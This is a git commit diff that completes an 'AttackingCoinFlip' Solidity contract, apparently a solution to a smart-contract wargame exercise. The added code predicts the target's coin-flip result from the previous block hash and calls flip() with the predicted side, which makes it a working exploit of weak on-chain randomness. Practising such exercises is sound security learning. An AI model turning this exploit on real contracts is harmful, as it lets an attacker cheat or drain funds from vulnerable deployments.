981133b76ccef5eee97a00d0c5c9361cb00e6612
Pedro Yan Ornelas <pedroyane@gmail.com>
2022-12-10 19:54:37 -0300

    Finished attack contract

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -3,13 +3,20 @@ pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
 contract AttackingCoinFlip {
-    CoinFlip public contractAddress;
+    CoinFlip public immutable coinFlipContract;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(CoinFlip _contractAddress) {
-        contractAddress = _contractAddress;
+        coinFlipContract = _contractAddress;
     }
 
     function hackContract() external {
         // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        coinFlipContract.flip(side);
     }
 }
